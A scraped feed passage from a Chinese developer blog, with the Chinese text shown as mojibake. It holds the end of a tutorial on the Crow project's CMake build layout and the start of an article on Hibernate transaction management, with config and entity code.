<li>ä½†å¤´æ–‡ä»¶åœ¨æ ¹ç›®å½•çš„ <code>include/</code> ä¸­</li>
</ul>
</li>
</ol>
<h4 data-id="heading-21">4.4 å˜é‡æœªå®šä¹‰é—®é¢˜</h4>
<pre><code class="hljs language-cmake" lang="cmake">if("compression" IN_LIST CROW_FEATURES)
</code></pre>
<ul>
<li><code>CROW_FEATURES</code> åœ¨æ ¹ç›®å½•æ ¹æ® <code>CROW_ENABLE_COMPRESSION</code> å’Œ <code>CROW_ENABLE_SSL</code> è®¾ç½®</li>
<li>ä» <code>examples</code> ç›®å½•æ‰§è¡Œæ—¶ï¼Œè¿™äº›å˜é‡æœªå®šä¹‰</li>
<li>æ¡ä»¶åˆ¤æ–­å¯èƒ½äº§ç”Ÿæ„å¤–è¡Œä¸º</li>
</ul>
<h4 data-id="heading-22">4.5 CMake å­é¡¹ç›®æœºåˆ¶çš„æœ¬è´¨</h4>
<p>CMake çš„ <code>add_subdirectory()</code> æœºåˆ¶è®¾è®¡ä¸Šå°±æ˜¯<strong>å•å‘ä¾èµ–</strong>çš„ï¼š</p>
<ul>
<li><strong>çˆ¶ç›®å½• â†’ å­ç›®å½•</strong>ï¼šçˆ¶ç›®å½•çš„æ‰€æœ‰å®šä¹‰ï¼ˆç›®æ ‡ã€å˜é‡ã€å‡½æ•°ï¼‰å¯¹å­ç›®å½•å¯è§ âœ…</li>
<li><strong>å­ç›®å½• â†’ çˆ¶ç›®å½•</strong>ï¼šå­ç›®å½•ä¸èƒ½ç‹¬ç«‹è¿è¡Œï¼Œå¿…é¡»é€šè¿‡çˆ¶ç›®å½•è°ƒç”¨ âŒ</li>
</ul>
<p>è¿™æ˜¯ CMake çš„è®¾è®¡å“²å­¦ï¼š<strong>å­é¡¹ç›®æ˜¯çˆ¶é¡¹ç›®çš„ç»„æˆéƒ¨åˆ†ï¼Œä¸æ˜¯ç‹¬ç«‹é¡¹ç›®</strong>ã€‚</p>
<h3 data-id="heading-23">äº”ã€æ­£ç¡®çš„ä½¿ç”¨æ–¹å¼</h3>
<h4 data-id="heading-24">5.1 æ ‡å‡†æ„å»ºæµç¨‹</h4>
<pre><code class="hljs language-powershell" lang="powershell"># 1. åœ¨æ ¹ç›®å½•é…ç½® CMake
cd C:\Users\notfr\projects\Crow
cmake -B build -S .

# 2. åœ¨æ ¹ç›®å½•æ„å»ºæ‰€æœ‰ç›®æ ‡
cmake --build build

# 3. åœ¨æ ¹ç›®å½•åªæ„å»º basic_example
cmake --build build --target basic_example
</code></pre>
<h4 data-id="heading-25">5.2 ä¸ºä»€ä¹ˆè¿™æ ·è®¾è®¡</h4>
<ol>
<li><strong>å•ä¸€é…ç½®æº</strong>ï¼šæ‰€æœ‰ CMake é€‰é¡¹ï¼ˆå¦‚ <code>CROW_ENABLE_SSL</code>ï¼‰åœ¨æ ¹ç›®å½•ç»Ÿä¸€é…ç½®</li>
<li><strong>ä¾èµ–ç®¡ç†é›†ä¸­</strong>ï¼šæ‰€æœ‰ä¾èµ–åº“ï¼ˆasioã€OpenSSL ç­‰ï¼‰åœ¨æ ¹ç›®å½•ç»Ÿä¸€æŸ¥æ‰¾å’Œé…ç½®</li>
<li><strong>ç›®æ ‡å¯è§æ€§</strong>ï¼š<code>Crow::Crow</code> ç›®æ ‡å¯¹æ‰€æœ‰å­é¡¹ç›®å¯è§</li>
<li><strong>æ„å»ºä¸€è‡´æ€§</strong>ï¼šç¡®ä¿æ‰€æœ‰å­é¡¹ç›®ä½¿ç”¨ç›¸åŒçš„ç¼–è¯‘é€‰é¡¹å’Œé…ç½®</li>
</ol>
<h4 data-id="heading-26">5.3 å¦‚æœç¡®å®éœ€è¦ç‹¬ç«‹æ„å»º</h4>
<p>å¦‚æœç¡®å®éœ€è¦ä» <code>examples</code> ç›®å½•ç‹¬ç«‹æ„å»ºï¼ˆä¸æ¨èï¼‰ï¼Œéœ€è¦ï¼š</p>
<ol>
<li>
<p><strong>ä¿®æ”¹è·¯å¾„å¼•ç”¨</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># ä½¿ç”¨ç›¸å¯¹è·¯å¾„æˆ–ç»å¯¹è·¯å¾„
include(../cmake/compiler_options.cmake)
</code></pre>
</li>
<li>
<p><strong>æ‰‹åŠ¨å®šä¹‰ Crow::Crow ç›®æ ‡</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># æŸ¥æ‰¾ä¾èµ–
list(APPEND CMAKE_MODULE_PATH ${CMAKE_CURRENT_SOURCE_DIR}/../cmake)
find_package(asio REQUIRED)

# åˆ›å»ºç›®æ ‡
add_library(Crow INTERFACE)
add_library(Crow::Crow ALIAS Crow)
target_include_directories(Crow INTERFACE ${CMAKE_CURRENT_SOURCE_DIR}/../include)
target_link_libraries(Crow INTERFACE asio::asio)
</code></pre>
</li>
<li>
<p><strong>è®¾ç½®å¿…è¦çš„å˜é‡</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake">if(NOT DEFINED CROW_FEATURES)
    set(CROW_FEATURES "")
endif()
</code></pre>
</li>
</ol>
<p>ä½†è¿™æ ·åšä¼šï¼š</p>
<ul>
<li>ç ´åé¡¹ç›®çš„ç»Ÿä¸€æ€§</li>
<li>å¢åŠ ç»´æŠ¤æˆæœ¬</li>
<li>å¯èƒ½å¯¼è‡´é…ç½®ä¸ä¸€è‡´</li>
</ul>
<h3 data-id="heading-27">å…­ã€æ€»ç»“</h3>
<h4 data-id="heading-28">6.1 æ ¸å¿ƒè¦ç‚¹</h4>
<ol>
<li>
<p><strong>æ ¹ç›®å½• CMakeLists.txt</strong> æ˜¯æ„å»ºç³»ç»Ÿçš„æ ¸å¿ƒï¼š</p>
<ul>
<li>å®šä¹‰é¡¹ç›®åŸºç¡€è®¾æ–½</li>
<li>æŸ¥æ‰¾å’Œé…ç½®æ‰€æœ‰ä¾èµ–åº“</li>
<li>åˆ›å»º <code>Crow::Crow</code> INTERFACE åº“ç›®æ ‡</li>
<li>è®¾ç½®å…¨å±€å˜é‡å’Œé€‰é¡¹</li>
</ul>
</li>
<li>
<p><strong>examples/CMakeLists.txt</strong> æ˜¯å­é¡¹ç›®ï¼š</p>
<ul>
<li>ä¾èµ–çˆ¶ç›®å½•çš„æ‰€æœ‰å®šä¹‰</li>
<li>ä½¿ç”¨çˆ¶ç›®å½•çš„ç›®æ ‡ã€å˜é‡å’Œå‡½æ•°</li>
<li>ä¸èƒ½ç‹¬ç«‹è¿è¡Œ</li>
</ul>
</li>
<li>
<p><strong>ä¸èƒ½ä» examples ç›®å½•æ‰§è¡Œçš„åŸå› </strong>ï¼š</p>
<ul>
<li>è·¯å¾„è§£æé”™è¯¯ï¼ˆ<code>CMAKE_SOURCE_DIR</code> æŒ‡å‘é”™è¯¯ï¼‰</li>
<li>ç›®æ ‡ä¸å­˜åœ¨ï¼ˆ<code>Crow::Crow</code> æœªå®šä¹‰ï¼‰</li>
<li>ä¾èµ–åº“æœªæŸ¥æ‰¾ï¼ˆasio ç­‰ï¼‰</li>
<li>å˜é‡æœªå®šä¹‰ï¼ˆ<code>CROW_FEATURES</code> ç­‰ï¼‰</li>
<li>è¿å CMake å­é¡¹ç›®è®¾è®¡åŸåˆ™</li>
</ul>
</li>
</ol>
<h4 data-id="heading-29">6.2 æœ€ä½³å®è·µ</h4>
<ul>
<li>âœ… <strong>å§‹ç»ˆä»æ ¹ç›®å½•æ‰§è¡Œ CMake</strong></li>
<li>âœ… <strong>ä½¿ç”¨ <code>--target</code> é€‰é¡¹åªæ„å»ºéœ€è¦çš„ç›®æ ‡</strong></li>
<li>âœ… <strong>ä¿æŒå­é¡¹ç›®å¯¹çˆ¶ç›®å½•çš„ä¾èµ–å…³ç³»</strong></li>
<li>âŒ <strong>ä¸è¦å°è¯•ä»å­ç›®å½•ç‹¬ç«‹æ„å»º</strong></li>
</ul>
<h4 data-id="heading-30">6.3 è®¾è®¡å“²å­¦</h4>
<p>Crow é¡¹ç›®çš„ CMake ç»“æ„ä½“ç°äº†ç°ä»£ CMake çš„æœ€ä½³å®è·µï¼š</p>
<ul>
<li><strong>æ¥å£åº“ï¼ˆINTERFACE Libraryï¼‰</strong>ï¼šé€‚åˆ header-only åº“</li>
<li><strong>ç›®æ ‡å¯¼å‘</strong>ï¼šä½¿ç”¨ <code>target_*</code> å‘½ä»¤è€Œéå…¨å±€å˜é‡</li>
<li><strong>å­é¡¹ç›®ç»„ç»‡</strong>ï¼šé€šè¿‡ <code>add_subdirectory()</code> ç®¡ç†å¤æ‚é¡¹ç›®</li>
<li><strong>ä¾èµ–ä¼ æ’­</strong>ï¼šé€šè¿‡ INTERFACE å±æ€§è‡ªåŠ¨ä¼ æ’­ä¾èµ–</li>
</ul>
<p>è¿™ç§è®¾è®¡ç¡®ä¿äº†æ„å»ºç³»ç»Ÿçš„ä¸€è‡´æ€§ã€å¯ç»´æŠ¤æ€§å’Œå¯æ‰©å±•æ€§ã€‚</p>
<h2 data-id="heading-31">é™„1 Cmakeä¸‰ä¸ªæœ€é‡è¦çš„è¯­æ³•</h2>
<p>æˆ‘ä»¬ç”¨â€œå‰ƒåˆ€åŸåˆ™â€ï¼ˆå³å¥¥å¡å§†å‰ƒåˆ€ï¼šå¦‚æ— å¿…è¦ï¼Œå‹¿å¢å®ä½“ï¼‰æ¥æ€è€ƒ CMake â€”â€” åªä¿ç•™æœ€æ ¸å¿ƒã€æœ€å¿…è¦ã€èƒ½æ”¯æ’‘ç»å¤§å¤šæ•°é¡¹ç›®çš„ä¸‰ä¸ªè¯­æ³•è¦ç´ ã€‚å»æ‰èŠ±é‡Œèƒ¡å“¨çš„ç»†èŠ‚ï¼Œåªè®²çœŸæ­£â€œä¸å¯æˆ–ç¼ºâ€çš„ä¸‰ä»¶å¥—ã€‚</p>
<hr/>
<h4 data-id="heading-32">âœ‚ï¸ å‰ƒåˆ€åŸåˆ™ä¸‹çš„ CMake æœ€é‡è¦ä¸‰ä¸ªè¯­æ³•ï¼š</h4>
<h5 data-id="heading-33">1. <strong>project() â€”â€” å®šä¹‰ä½ çš„é¡¹ç›®åå­—å’Œè¯­è¨€</strong></h5>
<blockquote>
<p><strong>ä¸ºä»€ä¹ˆå¿…è¦ï¼Ÿ</strong> æ²¡æœ‰é¡¹ç›®ï¼ŒCMake å°±ä¸çŸ¥é“ä½ åœ¨æ„å»ºä»€ä¹ˆã€‚</p>
<p><strong>é€šä¿—ç†è§£</strong>ï¼šå°±åƒä½ å†™ä½œæ–‡è¦å…ˆèµ·ä¸ªæ ‡é¢˜ï¼Œ<code>project()</code> å°±æ˜¯ç»™ä½ çš„ä»£ç å·¥ç¨‹èµ·ä¸ªâ€œåå­—â€ã€‚</p>
</blockquote>
<pre><code class="hljs language-cmake" lang="cmake"># æœ€ç®€å½¢å¼
project(MyApp)

# æ›´å¸¸è§ï¼šæŒ‡å®šè¯­è¨€ï¼ˆC++ æ˜¯é»˜è®¤ï¼Œä½†æ˜¾å¼å†™å‡ºæ›´æ¸…æ™°ï¼‰
project(MyApp LANGUAGES CXX)
</code></pre>
<p>âœ… <strong>å‰ƒåˆ€ç†ç”±</strong>ï¼šæ²¡æœ‰ <code>project()</code>ï¼Œåç»­å¾ˆå¤šå˜é‡ï¼ˆæ¯”å¦‚ <code>${PROJECT_NAME}</code>ï¼‰éƒ½æ— æ³•ä½¿ç”¨ï¼Œæ„å»ºç³»ç»Ÿä¹Ÿæ— æ³•æ­£ç¡®åˆå§‹åŒ–ã€‚</p>
<hr/>
<h5 data-id="heading-34">2. <strong>add_executable() æˆ– add_library() â€”â€” å‘Šè¯‰ CMake è¦ç”Ÿæˆä»€ä¹ˆ</strong></h5>
<blockquote>
<p><strong>ä¸ºä»€ä¹ˆå¿…è¦ï¼Ÿ</strong> ä½ æ€»å¾—å‘Šè¯‰ CMakeï¼šâ€œæˆ‘è¦ç¼–è¯‘å‡ºä¸€ä¸ªå¯æ‰§è¡Œç¨‹åºâ€è¿˜æ˜¯â€œæˆ‘è¦æ‰“åŒ…æˆä¸€ä¸ªåº“â€ã€‚</p>
</blockquote>
<pre><code class="hljs language-cmake" lang="cmake"># ç¼–è¯‘ä¸€ä¸ªå« my_app çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæºç æ˜¯ main.cpp
add_executable(my_app main.cpp utils.cpp)

# æˆ–è€…ç¼–è¯‘ä¸€ä¸ªé™æ€åº“
add_library(my_utils STATIC utils.cpp helper.cpp)
</code></pre>
<p>âœ… <strong>å‰ƒåˆ€ç†ç”±</strong>ï¼šè¿™æ˜¯ CMake çš„â€œç›®æ ‡â€ï¼ˆtargetï¼‰æœºåˆ¶çš„æ ¸å¿ƒã€‚ä¸å®šä¹‰ç›®æ ‡ï¼Œå°±æ²¡æœ‰ä»»ä½•ä¸œè¥¿ä¼šè¢«ç¼–è¯‘ï¼</p>
<hr/>
<h5 data-id="heading-35">3. <strong>target_link_libraries() â€”â€” å‘Šè¯‰ CMake ç›®æ ‡ä¾èµ–ä»€ä¹ˆ</strong></h5>
<blockquote>
<p><strong>ä¸ºä»€ä¹ˆå¿…è¦ï¼Ÿ</strong> ç¨‹åºå¾ˆå°‘å­¤ç«‹å­˜åœ¨ï¼Œé€šå¸¸è¦é“¾æ¥æ ‡å‡†åº“ã€ç¬¬ä¸‰æ–¹åº“ï¼Œæˆ–è€…è‡ªå·±å†™çš„å…¶ä»–æ¨¡å—ã€‚</p>
</blockquote>
<pre><code class="hljs language-cmake" lang="cmake"># my_app ä¾èµ– my_utils è¿™ä¸ªåº“
target_link_libraries(my_app PRIVATE my_utils)

# æˆ–è€…é“¾æ¥ç³»ç»Ÿçº¿ç¨‹åº“
target_link_libraries(my_app PRIVATE Threads::Threads)
</code></pre>
<p>âœ… <strong>å‰ƒåˆ€ç†ç”±</strong>ï¼šç°ä»£ CMake å¼ºè°ƒâ€œåŸºäºç›®æ ‡çš„ä¾èµ–ç®¡ç†â€ã€‚ç”¨ <code>target_link_libraries()</code> ä¸ä»…èƒ½é“¾æ¥åº“ï¼Œè¿˜èƒ½è‡ªåŠ¨ä¼ é€’å¤´æ–‡ä»¶è·¯å¾„ã€ç¼–è¯‘é€‰é¡¹ç­‰â€”â€”å®ƒæ˜¯ç»„ç»‡ä¾èµ–çš„å”¯ä¸€ç®€æ´ä¸”æ­£ç¡®çš„æ–¹å¼ã€‚</p>
<hr/>
<h4 data-id="heading-36">ğŸ¯ ä¸¾ä¸ªå®Œæ•´å°ä¾‹å­ï¼ˆä¸‰è¡Œæå®šä¸€ä¸ª C++ é¡¹ç›®ï¼‰ï¼š</h4>
<pre><code class="hljs language-cmake" lang="cmake"># CMakeLists.txt
project(MyApp LANGUAGES CXX)
add_executable(hello main.cpp)
target_link_libraries(hello)  # æš‚æ— ä¾èµ–ï¼Œå¯çœç•¥ï¼Œä½†ä¹ æƒ¯ä¿ç•™ç»“æ„
</code></pre>
<p>å³ä½¿åªæœ‰è¿™ä¸‰è¡Œï¼Œä¹Ÿèƒ½åœ¨ä»»ä½•å¹³å°ç”Ÿæˆ Makefileã€Visual Studio å·¥ç¨‹æˆ– Xcode é¡¹ç›®ï¼</p>
<hr/>
<h4 data-id="heading-37">âœ… æ€»ç»“ï¼ˆå‰ƒåˆ€ä¸‰è¦ç´ ï¼‰ï¼š</h4>

























<table><thead><tr><th>è¯­æ³•</th><th>ä½œç”¨</th><th>ç±»æ¯”</th></tr></thead><tbody><tr><td><code>project()</code></td><td>èµ·åå­—ã€å®šè¯­è¨€</td><td>ç»™é¡¹ç›®åŠâ€œèº«ä»½è¯â€</td></tr><tr><td><code>add_executable()</code> / <code>add_library()</code></td><td>å®šä¹‰è¦æ„å»ºä»€ä¹ˆ</td><td>å†™â€œä»»åŠ¡æ¸…å•â€</td></tr><tr><td><code>target_link_libraries()</code></td><td>å£°æ˜ä¾èµ–å…³ç³»</td><td>ç”»â€œå…³ç³»å›¾â€</td></tr></tbody></table>
<p>åªè¦æŒæ¡è¿™ä¸‰ç‚¹ï¼Œ80% çš„ CMake é¡¹ç›®éƒ½èƒ½çœ‹æ‡‚ã€èƒ½å†™ã€‚å…¶ä½™éƒ½æ˜¯é”¦ä¸Šæ·»èŠ±ï¼Œéâ€œå¿…è¦â€ã€‚</p>
<blockquote>
<p>ğŸ’¡ è®°ä½ï¼šCMake çš„æ ¸å¿ƒæ€æƒ³ä¸æ˜¯â€œæ€ä¹ˆç¼–è¯‘â€ï¼Œè€Œæ˜¯â€œæè¿°ä½ çš„é¡¹ç›®ç»“æ„â€ã€‚è¶Šç®€å•ï¼Œè¶Šå¼ºå¤§ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernateï¼ˆ53ï¼‰Hibernateçš„äº‹åŠ¡ç®¡ç†å¦‚ä½•å®ç°ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7597270795211948072</link>    <guid>https://juejin.cn/post/7597270795211948072</guid>    <pubDate>2026-01-20T11:55:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597270795211948072" data-draft-id="7597266967138140194" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernateï¼ˆ53ï¼‰Hibernateçš„äº‹åŠ¡ç®¡ç†å¦‚ä½•å®ç°ï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-20T11:55:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernateï¼ˆ53ï¼‰Hibernateçš„äº‹åŠ¡ç®¡ç†å¦‚ä½•å®ç°ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T11:55:03.000Z" title="Tue Jan 20 2026 11:55:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Hibernateçš„äº‹åŠ¡ç®¡ç†æ˜¯ç¡®ä¿ä¸€ç»„æ•°æ®åº“æ“ä½œè¦ä¹ˆå…¨éƒ¨æˆåŠŸï¼Œè¦ä¹ˆå…¨éƒ¨å¤±è´¥ï¼ˆå›æ»šï¼‰çš„æœºåˆ¶ã€‚å®ƒåœ¨ç¡®ä¿æ•°æ®ä¸€è‡´æ€§å’Œå®Œæ•´æ€§æ–¹é¢èµ·ç€å…³é”®ä½œç”¨ã€‚Hibernateæ”¯æŒå¤šç§äº‹åŠ¡ç®¡ç†æ–¹å¼ï¼Œå¦‚ç¨‹åºåŒ–äº‹åŠ¡ç®¡ç†å’Œå£°æ˜å¼äº‹åŠ¡ç®¡ç†ã€‚ä»¥ä¸‹æ˜¯è¯¦ç»†çš„äº‹åŠ¡ç®¡ç†å®ç°å’Œä»£ç ç¤ºä¾‹ã€‚</p>
<h3 data-id="heading-0">1. ç¨‹åºåŒ–äº‹åŠ¡ç®¡ç†</h3>
<p>ç¨‹åºåŒ–äº‹åŠ¡ç®¡ç†æ˜¯æŒ‡åœ¨ä»£ç ä¸­æ˜¾å¼åœ°æ§åˆ¶äº‹åŠ¡çš„å¼€å§‹ã€æäº¤å’Œå›æ»šã€‚é€‚ç”¨äºç®€å•åº”ç”¨æˆ–éœ€è¦ç²¾ç¡®æ§åˆ¶äº‹åŠ¡è¾¹ç•Œçš„åœºæ™¯ã€‚</p>
<h4 data-id="heading-1">é…ç½®Hibernate</h4>
<p>åœ¨<code>hibernate.cfg.xml</code>ä¸­é…ç½®Hibernateï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- æ•°æ®åº“è¿æ¥é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate å±æ€§é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- æ˜ å°„ç±» --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Product"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-2">å®ä½“ç±»å®šä¹‰</h4>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„å®ä½“ç±»<code>Product</code>çš„å®šä¹‰ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "product")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@Column(name = "price")</span>
    <span class="hljs-keyword">private</span> Double price;

    <span class="hljs-comment">// Getters and Setters</span>
}
</code></pre>
